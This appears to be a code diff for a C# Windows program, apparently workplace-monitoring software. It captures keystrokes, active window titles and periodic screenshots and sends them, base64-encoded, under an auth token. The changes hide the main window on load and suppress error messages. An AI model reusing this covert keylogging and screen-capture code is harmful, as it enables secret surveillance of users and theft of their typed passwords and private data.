@@ -84,10 +84,15 @@ namespace advanced_ckey
 
         private void timer1_Tick(object sender, EventArgs e)   //timer1 set to 1 to gets the active windows title at timer 1 ticking
         {
+            if(helper.islogged )
+            {
+
+          
             if (strin != GetActiveWindowTitle())
             {
                 textBox1.Text = textBox1.Text + Environment.NewLine + Environment.NewLine + "[" + GetActiveWindowTitle() + "]" + Environment.NewLine;
                 strin = GetActiveWindowTitle();
+            }
             }
         }
 
@@ -130,14 +135,20 @@ namespace advanced_ckey
                 {
                     captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
                 }
-                System.IO.MemoryStream stream = new System.IO.MemoryStream();
+                string screenshot="";
+              using (  System.IO.MemoryStream stream = new System.IO.MemoryStream())
+                {
+
+
                 bitmap.Save( stream, ImageFormat.Jpeg);
                 byte[] imageBytes = stream.ToArray();
-            //    string path = @"C:\MyDir\Screenshot\" + filename;
-            //    bitmap.Save( path, ImageFormat.Jpeg);
-            //    byte[] imageBytes = File.ReadAllBytes( path );
+                    //    string path = @"C:\MyDir\Screenshot\" + filename;
+                    //    bitmap.Save( path, ImageFormat.Jpeg);
+                    //    byte[] imageBytes = File.ReadAllBytes( path );
+               
+                screenshot = Convert.ToBase64String(imageBytes);
+                }
 
-                string screenshot = Convert.ToBase64String(imageBytes);
                 string keystrokes = JsonSerializer.Serialize(this.loggedText);
             //    MessageBox.Show( screenshot.Length.ToString() );
             //    textBox1.Text += keystrokes;
@@ -184,8 +195,13 @@ namespace advanced_ckey
                             {
                                 Properties.Settings.Default.auth_token = "";
                                 Properties.Settings.Default.user_id = "";
-                                MessageBox.Show( "Authentication failed" );   
-                                new Formlog();
+                               // MessageBox.Show( "Authentication failed" );
+                                if (helper.iswaiting == false)
+                                {
+                                    helper.islogged = false;
+                                    var k = new Formlog();
+                                    k.Show();
+                                }
                                 return;
                             }
                         //    MessageBox.Show( result["goodnews"] );
@@ -198,8 +214,14 @@ namespace advanced_ckey
                             {
                                 Properties.Settings.Default.auth_token = "";
                                 Properties.Settings.Default.user_id = "";
-                                MessageBox.Show( "Authentication failed" );   
-                                new Formlog();
+                              //  MessageBox.Show( "Authentication failed" );
+                                if (helper.iswaiting == false)
+                                {
+                                    helper.islogged = false;
+                                    var k = new Formlog();
+                                    k.Show();
+                                }
+
                             }
                             return;
                         }
@@ -209,12 +231,24 @@ namespace advanced_ckey
                 }
                 catch (Exception x2 )
                 {
-                    MessageBox.Show( x2.Message );
+                    if (helper.iswaiting == false)
+                    {
+                        helper.islogged = false;
+                        var k = new Formlog();
+                        k.Show();
+                    }
+                    // MessageBox.Show( x2.Message );
                 }
             }
             catch(Exception x1 )
             {
-                MessageBox.Show( x1.Message );
+                if (helper.iswaiting == false)
+                {
+                    helper.islogged = false;
+                    var k = new Formlog();
+                    k.Show();
+                }
+                // MessageBox.Show( x1.Message );
             }
         }
 
@@ -234,7 +268,7 @@ namespace advanced_ckey
 
         private void Form1_Load(object sender, EventArgs e)
         {
-           
+            this.Hide();
             try
             {
                 Directory.CreateDirectory(@"C:\MyDir\Screenshot");  // create a diretory for saving the screenshot file
@@ -347,7 +381,12 @@ namespace advanced_ckey
 
         private void Sceenshot_timer_Tick(object sender, EventArgs e)
         {
-            screenshot();
+            if (helper.islogged ==true)
+            {
+                screenshot();
+            }
+           
+           
         }
 
         [DllImport("user32.dll", EntryPoint = "ToUnicodeEx", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
@@ -363,6 +402,46 @@ namespace advanced_ckey
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             Application.Exit();
+        }
+
+       
+        protected void Displaynotify()
+        {
+            try
+            {
+                notifyIcon1.Text = "Workplace";
+                notifyIcon1.Visible = true;
+                notifyIcon1.BalloonTipTitle = "Login or Change workplace";
+                notifyIcon1.BalloonTipText = "Change your workplace now";
+                notifyIcon1.ShowBalloonTip(1000000);
+            }
+            catch (Exception)
+            {
+            }
+        }
+
+        private void notifyIcon1_BalloonTipClicked(object sender, EventArgs e)
+        {
+          
+              
+              
+                  
+
+            
+
+          
+
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+
+        }
+
+        private void notifyIcon1_Click(object sender, EventArgs e)
+        {
+            Formlog ky = new Formlog();
+            ky.Show();
         }
     }
 }
